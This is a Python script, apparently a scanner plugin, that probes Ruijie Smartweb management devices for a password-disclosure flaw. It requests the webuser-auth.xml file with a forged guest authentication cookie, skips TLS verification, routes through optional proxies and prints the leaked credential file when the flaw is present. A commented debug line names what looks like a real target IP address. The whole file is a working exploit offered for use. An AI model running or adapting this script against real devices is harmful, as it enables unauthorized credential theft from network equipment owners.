import requests
import re
from bs4 import BeautifulSoup
import logging

uia = ''
http = ''
https = ''
def dl201(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie=None):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        #-------------------------------以下可修改
        headers = {
            'Cookie': 'auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest; login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302',
        }
        gf = requests.get(url+'web/xml/webuser-auth.xml',cookies=s_cookie,headers=headers,proxies=proxies,verify=False)
        if gf.status_code == 200 and 'Authorization Required' in gf.text:
            uia = '[+]漏洞存在\nweb/xml/webuser-auth.xml\n'+gf.text
        else:
            uia='[-]漏洞不存在'
        # -------------------------------
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
#----------------调试
# ty('https://58.63.47.210:14430/')
# print(uia)
#----------------
def yt1():
    global uia
    return '--------------------------------------------------\n[ 锐捷Smartweb管理系统 密码信息泄露漏洞 ]\n\n'+ str (uia)+'\n'
def yt1a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)